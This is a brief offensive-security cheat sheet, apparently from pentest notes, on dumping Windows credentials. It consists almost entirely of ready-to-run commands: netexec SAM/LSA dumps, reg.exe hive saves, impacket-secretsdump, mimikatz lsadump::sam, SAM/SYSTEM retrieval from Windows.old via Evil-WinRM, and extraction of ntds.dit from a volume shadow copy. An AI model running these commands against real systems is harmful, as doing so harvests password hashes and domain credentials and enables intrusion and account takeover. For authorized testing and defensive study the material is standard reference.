# SAM & LSA Dumping
## Summary


```bash
nxc smb <target-ip> --local-auth -u <admin> -p <password> --sam
nxc smb <target-ip> --local-auth -u <admin> -p <password> --lsa

reg.exe save hklm\sam C:\sam.hive
reg.exe save hklm\security C:\security.hive
reg.exe save hklm\system C:\system.hive


impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL

secretsdump.py -sam SAM -system SYSTEM LOCAL

.\mimikatz.exe privilege::debug token::elevate lsadump::sam
```

## Windows.OLD
The **Windows.old** folder is a directory automatically created by Windows when you **upgrade your operating system** (e.g., upgrading from Windows 10 to Windows 11, or installing a major feature update).
It contains a complete copy of your **previous Windows installation** files, settings, and user data. 
Because of this, we can get extract the old **SAM/SYSTEM**, and then crack.
```bash

# windows.old, dump sam system 
*Evil-WinRM* PS C:\windows.old\windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\windows\system32> download SYSTESM

secretsdump.py -sam SAM -system SYSTEM LOCAL

```

## Shadow Copies - VSS

```powershell
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```